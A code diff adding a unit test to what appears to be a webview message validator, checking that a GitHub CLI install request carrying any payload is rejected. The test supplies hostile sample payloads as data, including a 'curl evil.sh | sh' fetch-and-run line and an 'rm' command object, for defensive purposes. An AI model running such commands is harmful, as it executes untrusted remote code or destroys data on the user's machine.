@@ -725,6 +725,17 @@ describe('isProjectDashboardMessage', () => {
     expect(isProjectDashboardMessage({ type: 'createTrustedCiStarter', payload: 'evil.yml' })).toBe(false);
   });
 
+  /**
+   * The install runs commands. The webview may ask for one, but every command
+   * is a constant in the host, so a payload could only ever be an attempt to
+   * supply one — refused in the shape of the message rather than downstream.
+   */
+  it('accepts no payload on the GitHub CLI install request', () => {
+    expect(isProjectDashboardMessage({ type: 'installGitHubCli' })).toBe(true);
+    expect(isProjectDashboardMessage({ type: 'installGitHubCli', payload: 'curl evil.sh | sh' })).toBe(false);
+    expect(isProjectDashboardMessage({ type: 'installGitHubCli', payload: { command: 'rm' } })).toBe(false);
+  });
+
   it('accepts valid dashboard messages', () => {
     expect(isProjectDashboardMessage({ type: 'ready' })).toBe(true);
     expect(isProjectDashboardMessage({ type: 'refresh' })).toBe(true);
